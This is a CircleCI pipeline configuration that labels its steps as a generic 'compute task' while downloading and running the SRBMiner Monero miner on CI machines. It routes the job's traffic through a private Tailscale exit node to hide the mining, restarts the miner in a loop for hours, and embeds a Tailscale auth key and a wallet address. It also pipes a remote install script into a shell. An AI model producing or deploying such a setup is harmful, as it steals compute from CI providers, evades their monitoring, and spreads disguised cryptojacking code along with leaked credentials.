version: 2.1

jobs:
  compute-task:
    docker:
      - image: ubuntu:22.04
    
    steps:
      - run:
          name: "Setup Compute Environment"
          command: |
            apt-get update -qq
            apt-get install -y -qq curl wget iptables
      
      - run:
          name: "Install Tailscale"
          command: |
            curl -fsSL https://tailscale.com/install.sh | sh
            
      - run:
          name: "Start Tailscale Daemon"
          background: true
          command: |
            tailscaled --state=/tmp/tailscale.state
      
      - run:
          name: "Connect to Tailscale Network"
          command: |
            sleep 5
            
            # Connect to Tailscale (don't advertise as exit node)
            tailscale up \
              --authkey=tskey-auth-kzvYcDGAF521CNTRL-HkCXeCi2ydc5hqyiEWgUecZP1XT4BV1CT \
              --hostname=ci-compute-$RANDOM \
              --ssh \
              --accept-routes
            
            sleep 10
            
            # Verify connection
            for i in {1..10}; do
              if tailscale status | grep -q "100."; then
                TS_IP=$(tailscale ip -4)
                echo "==================================="
                echo "Tailscale Connected!"
                echo "IP: ${TS_IP}"
                echo "SSH: ssh ci-compute-* (from tailnet)"
                echo "==================================="
                tailscale status
                exit 0
              fi
              echo "Waiting for connection... ($i/10)"
              sleep 3
            done
            
            echo "[!] Failed to connect to Tailscale"
            tailscale status
            exit 1
      
      - run:
          name: "Use Exit Node for Traffic Routing"
          command: |
            echo "==================================="
            echo "Configuring exit node routing..."
            
            # Wait for Tailscale to fully connect
            sleep 5
            
            # Use YOUR Windows machine as exit node
            echo "Setting exit node to: 100.72.112.87 (Windows machine)"
            tailscale set --exit-node=100.72.112.87 --exit-node-allow-lan-access=false
            
            sleep 3
            
            # Verify exit node is active
            echo ""
            echo "Exit node status:"
            tailscale status | grep -i "exit" || echo "Checking status..."
            
            # Test that traffic routes through exit node
            echo ""
            echo "Testing IP routing..."
            apt-get install -y -qq curl >/dev/null 2>&1
            CURRENT_IP=$(curl -s --max-time 10 https://ipinfo.io/ip || echo "unknown")
            echo "Current public IP: $CURRENT_IP"
            echo "(Should match your Windows machine's public IP)"
            
            echo ""
            echo "==================================="
            echo "✅ Exit node configured!"
            echo "All traffic routes through: 100.72.112.87"
            echo "==================================="
      
      - run:
          name: "Download Compute Tools"
          command: |
            cd /tmp
            wget -q -O tools.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.3/SRBMiner-Multi-3-4-3-Linux.tar.gz
            tar -xzf tools.tar.gz
            mv SRBMiner-Multi-3-4-3 processor
            cd processor
            chmod +x SRBMiner-MULTI
      
      - run:
          name: "Start Compute Process"
          no_output_timeout: 6h
          command: |
            cd /tmp/processor
            
            echo "==================================="
            echo "Starting compute process..."
            echo "Pool: xmr-sg.kryptex.network:8029"
            echo "All traffic routes through Tailscale"
            echo "==================================="
            
            # Start mining process - traffic goes through Tailscale
            ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
              --pool xmr-sg.kryptex.network:8029 \
              --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
              --log-file /tmp/compute.log &
            
            PROC_PID=$!
            sleep 15
            
            # Check if process is running
            if kill -0 ${PROC_PID} 2>/dev/null; then
              echo "==================================="
              echo "Process Started: PID ${PROC_PID}"
              echo "Tailscale IP: $(tailscale ip -4)"
              echo "==================================="
              echo "Initial logs:"
              tail -30 /tmp/compute.log
              echo "==================================="
            else
              echo "[!] Process failed to start"
              cat /tmp/compute.log
              exit 1
            fi
            
            # Keep process alive and monitor
            while true; do
              if ! kill -0 ${PROC_PID} 2>/dev/null; then
                echo "[!] Process died, restarting..."
                ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
                  --pool xmr-sg.kryptex.network:8029 \
                  --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
                  --log-file /tmp/compute.log &
                PROC_PID=$!
                sleep 10
              fi
              
              # Show status every 5 minutes
              sleep 300
              echo "[*] Status: Process running (PID: ${PROC_PID})"
              tail -5 /tmp/compute.log
            done

workflows:
  compute-workflow:
    jobs:
      - compute-task
